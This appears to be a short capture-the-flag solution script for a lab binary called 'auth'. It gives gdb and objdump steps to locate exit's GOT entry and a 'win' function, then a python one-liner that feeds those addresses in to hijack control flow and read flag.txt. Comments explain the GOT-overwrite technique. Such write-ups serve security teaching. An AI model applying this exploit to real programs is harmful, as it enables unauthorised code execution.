# This is manual solution
# Run:
	# $ gdb ../auth
	# $ disas exit
	# jump *0xADDRESS_1_HERE
# Then:
	objdump -t ../auth | grep "win" | cut -d' ' -f1
# Use the address with 0x prefix in the next command
(python -c "print('0xADDRESS_1_HERE'); print('0xADDRESS_2_HERE')"; cat) | ./auth
# If you have 64-bit system and you can't run 32-bit files add "qemu-i386" before "../auth"

# Then type:
# 	cat flag.txt

# Explanation:
#	The program lets us write 4 bytes to any address we want
#	So if we will write to the GOT entry of exit the address of win
#		instead of calling to exit the program will call to win
